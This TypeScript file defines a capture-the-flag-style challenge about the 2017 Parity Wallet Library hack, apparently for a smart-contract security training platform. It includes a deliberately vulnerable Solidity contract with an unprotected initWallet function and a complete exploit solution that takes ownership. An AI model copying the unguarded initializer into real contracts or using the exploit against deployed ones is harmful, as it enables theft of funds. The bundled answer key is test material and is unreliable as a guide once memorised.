import type { VulnerabilityChallenge } from "@/types/vulnerability";

const WALLET_LIBRARY_SOURCE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract WalletLibrary {
    address[] public owners;
    uint256 public required;

    function initWallet(address[] calldata _owners, uint256 _required, uint256 _dayLimit) external {
        require(owners.length == 0, "Already initialized");
        for (uint256 i = 0; i < _owners.length; i++) {
            owners.push(_owners[i]);
        }
        required = _required;
    }

    function isOwner(address _addr) external view returns (bool) {
        for (uint256 i = 0; i < owners.length; i++) {
            if (owners[i] == _addr) return true;
        }
        return false;
    }

    function getOwners() external view returns (address[] memory) {
        return owners;
    }

    function getRequired() external view returns (uint256) {
        return required;
    }
}`;

export const parityWalletChallenge: VulnerabilityChallenge = {
  id: "parity-wallet-library",
  title: "Parity Wallet Library Hack",
  category: "access-control",
  difficulty: "beginner",

  incident: {
    name: "Parity Wallet Library Hack",
    date: "November 2017",
    losses: "150,000 ETH (~30M USD)",
    references: [
      "https://medium.com/chainsecurity/parity-wallet-hack-2-analyze-the-attacks-5c9c2747a5a",
    ],
  },

  description: `# Parity Wallet Library Hack

## Background

In November 2017, a critical vulnerability was discovered in the Parity Wallet Library contract. The vulnerability allowed anyone to call the \`initWallet\` function and gain ownership of the contract.

## The Vulnerability

The \`initWallet\` function lacks access control:

\`\`\`solidity
function initWallet(address[] _owners, uint _required, uint _dayLimit) external {
    require(owners.length == 0, "Already initialized");
    // No check for who can call this!
    for (uint i = 0; i < _owners.length; i++) {
        owners.push(_owners[i]);
    }
    required = _required;
}
\`\`\`

Anyone can call this function before the contract is initialized and become an owner!

## Objective

The \`WalletLibrary\` contract is deployed. Exploit the vulnerability to become an owner by calling \`initWallet\`.

**Target**: \`WalletLibrary\` contract (address will be shown in the editor after setup)`,

  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWalletLibrary {
    function initWallet(address[] calldata _owners, uint256 _required, uint256 _dayLimit) external;
    function isOwner(address _addr) external view returns (bool);
}

contract Exploit {
    IWalletLibrary public target;
    address[] public owners;

    constructor(address _target) {
        target = IWalletLibrary(_target);
    }

    function attack() external {
        // TODO: Call initWallet to make this contract an owner
        // HINT: The initWallet function takes (address[] _owners, uint _required, uint _dayLimit)
    }
}`,

  hint: "The initWallet function has no access control. Call it with your exploit contract address (address(this)) as the owner in the array.",

  setup: {
    contracts: [
      {
        name: "WalletLibrary",
        source: WALLET_LIBRARY_SOURCE,
      },
    ],
    attackerBalance: "10",
  },

  exposedFunctions: [
    {
      name: "owners",
      signature: "owners(uint256)",
      inputs: [{ name: "index", type: "uint256" }],
      outputs: [{ name: "", type: "address" }],
      stateMutability: "view",
    },
    {
      name: "required",
      signature: "required()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
    {
      name: "isOwner",
      signature: "isOwner(address)",
      inputs: [{ name: "_addr", type: "address" }],
      outputs: [{ name: "", type: "bool" }],
      stateMutability: "view",
    },
    {
      name: "getOwners",
      signature: "getOwners()",
      inputs: [],
      outputs: [{ name: "", type: "address[]" }],
      stateMutability: "view",
    },
    {
      name: "getRequired",
      signature: "getRequired()",
      inputs: [],
      outputs: [{ name: "", type: "uint256" }],
      stateMutability: "view",
    },
  ],

  constructorParams: {
    params: [
      {
        name: "_target",
        type: "address",
        description: "The WalletLibrary contract address to attack",
      }
    ],
    autoFillOptions: {
      useDeployedContract: "WalletLibrary",
    }
  },

  successCondition: {
    checkOwnership: {
      contract: "WalletLibrary",
    },
  },

  solution: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWalletLibrary {
    function initWallet(address[] calldata _owners, uint256 _required, uint256 _dayLimit) external;
    function isOwner(address _addr) external view returns (bool);
}

contract Exploit {
    IWalletLibrary public target;
    address[] public owners;

    constructor(address _target) {
        target = IWalletLibrary(_target);
    }

    function attack() external {
        address[] memory newOwners = new address[](1);
        newOwners[0] = address(this);
        target.initWallet(newOwners, 1, 0);
    }
}`,
};